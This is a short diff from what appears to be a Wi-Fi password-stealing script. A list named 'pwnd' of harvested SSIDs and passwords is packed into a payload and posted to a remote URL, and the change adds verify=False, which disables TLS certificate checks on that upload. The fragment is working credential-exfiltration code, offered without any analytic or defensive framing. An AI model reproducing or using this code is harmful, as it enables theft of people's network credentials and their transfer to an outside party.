@@ -41,4 +41,4 @@ final_payload = ""
 for pwnd_ssid in pwnd:
     final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
 
-r = requests.post(url, params="format=json", data=final_payload)
+r = requests.post(url, params="format=json", data=final_payload, verify=False)
